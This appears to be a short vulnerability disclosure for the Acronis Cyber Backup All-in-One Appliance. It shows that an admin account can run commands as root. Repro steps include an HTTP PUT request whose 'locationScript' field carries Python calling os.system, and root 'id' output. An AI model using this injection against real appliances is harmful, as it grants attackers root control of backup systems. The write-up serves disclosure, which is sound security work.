# What is it
Acronis Cyber Backup "All-in-one" Appliance

More information can be found [here](https://dl.acronis.com/u/software-defined/html/AcronisCyberInfrastructure_3_5_storage_appliance_quick_start_guide_en-US/managing-storage-backup/creating-vm.html)

## Link
[https://dl.acronis.com/u/AcronisBackup12.5/Release/AcronisBackup_All-in-One_Appliance.zip](https://dl.acronis.com/u/AcronisBackup12.5/Release/AcronisBackup_All-in-One_Appliance.zip)

# Description
Any admin can execute commands as root on the system. Not necessarily a bug, but an noteworthy non-hardened design.

# Repro

1. Adduser test (unprivileged)
2. Settings/Administrator then Add Admin, select test user
3. Login as test
4. Plans, Backup, Create Plan + -> defined by script

```
PUT /api/ams/backup/plan_drafts/5570636D-6D36-45DE-8A30-BC81D912XXXX/location HTTP/1.1
....

{"subscriptionId":"4","operationId":"bc-setlocation-4-8","stageIndex":0,"type":"script","locationScript":"import os\nos.system('id>/tmp/123')","locationCredentials":{},"path":"script.py"}
```

5. Click "Run Now"

```
[root@AcronisAppliance-913D0 web]# cat /tmp/123
uid=0(root) gid=0(root) groups=0(root)
```
